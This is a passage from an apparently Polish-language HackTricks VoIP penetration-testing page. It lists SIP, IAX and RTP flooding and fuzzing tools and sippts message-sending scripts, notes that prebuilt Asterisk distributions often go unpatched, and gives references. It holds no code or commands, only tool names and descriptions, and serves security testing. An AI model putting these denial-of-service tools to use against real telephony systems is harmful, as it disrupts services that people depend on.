* [**IAXFlooder**](https://www.kali.org/tools/iaxflood/): Atak DoS na protokół IAX używany przez Asterisk
* [**inviteflood**](https://github.com/foreni-packages/inviteflood/blob/master/inviteflood/Readme.txt): Narzędzie do przeprowadzania ataku typu SIP/SDP INVITE flooding za pomocą UDP/IP.
* [**rtpflood**](https://www.kali.org/tools/rtpflood/): Wysyła kilka poprawnie sformowanych pakietów RTP. Należy znać używane porty RTP (najpierw podsłuchać).
* [**SIPp**](https://github.com/SIPp/sipp): Pozwala na analizę i generowanie ruchu SIP. Może być również używane do ataków typu DoS.
* [**SIPsak**](https://github.com/nils-ohlmeier/sipsak): Szwajcarski nóż SIP. Może również być używany do przeprowadzania ataków typu SIP.
* Fuzzery: [**protos-sip**](https://www.kali.org/tools/protos-sip/), [**voiper**](https://github.com/gremwell/voiper).
* **`sipsend.py`** z [**sippts**](https://github.com/Pepelux/sippts)**:** SIPSend pozwala nam wysyłać **niestandardowe wiadomości SIP** i analizować odpowiedź.
* **`wssend.py`** z [**sippts**](https://github.com/Pepelux/sippts)**:** WsSend pozwala nam wysyłać niestandardowe wiadomości SIP za pośrednictwem protokołu WebSockets i analizować odpowiedź.

### Podatności systemowe

Najprostszym sposobem zainstalowania oprogramowania takiego jak Asterisk jest pobranie dystrybucji systemu operacyjnego, w którym jest on już zainstalowany, takich jak: **FreePBX, Elastix, Trixbox**... Problem z tymi dystrybucjami polega na tym, że po uruchomieniu administratorzy systemu mogą **nie aktualizować ich ponownie**, a z czasem zostaną odkryte **podatności**.

## Odwołania

* [https://github.com/Pepelux/sippts/wiki](https://github.com/Pepelux/sippts/wiki)
* [http://blog.pepelux.org/](http://blog.pepelux.org/)
* [https://www.rtpbleed.com/](https://www.rtpbleed.com/)
* [https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4](https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4)
* [https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf)

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCYJNY**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
